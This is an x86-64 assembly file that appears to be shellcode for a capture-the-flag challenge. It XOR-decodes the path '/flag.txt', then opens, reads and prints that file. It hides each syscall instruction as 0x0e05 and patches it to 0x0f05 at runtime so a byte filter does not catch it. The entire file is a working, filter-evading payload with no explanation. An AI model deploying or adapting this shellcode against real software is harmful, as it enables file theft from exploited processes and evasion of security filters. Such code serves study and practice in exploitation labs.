.global _start
_start:
    .intel_syntax noprefix

	mov r9, 0x1010101010010101
	mov r8, 0x1064106410750175
	xor r9, r8
	push r9

	mov r9, 0x1010101010010101
	mov r8, 0x68643e77716d672e
	xor r9, r8
	push r9

	push 2
	pop rax
	xor r8, r8
	push r8
	pop rsi
	push r8
	pop rdx
	push rsp
	pop rdi
	lea r12, [rip + 0x7fffffff]
	sub r12, 0x7ffffff4
	inc byte ptr [r12]
	.byte 0x0e, 0x05

	push rax
	pop rdi
	xor r8, r8
	push r8
	pop rax
	push rsp
	pop rsi
	mov r8, 0x1111111
	xor r8, 0x1111101
	push r8
	pop rdx
	lea r12, [rip + 0x7fffffff]
	sub r12, 0x7ffffff4
	inc byte ptr [r12]
	.byte 0x0e, 0x05

	push rax
	pop rdx
	push rsp
	pop rsi
	push 1
	pop rdi
	push r8
	pop rdx
	push 1
	pop rax
	lea r12, [rip + 0x7fffffff]
	sub r12, 0x7ffffff4
	inc byte ptr [r12]
	.byte 0x0e, 0x05

	push 60
	pop rax
	xor r8, r8
	push r8
	pop rdi
	lea r12, [rip + 0x7fffffff]
	sub r12, 0x7ffffff4
	inc byte ptr [r12]
	.byte 0x0e, 0x05
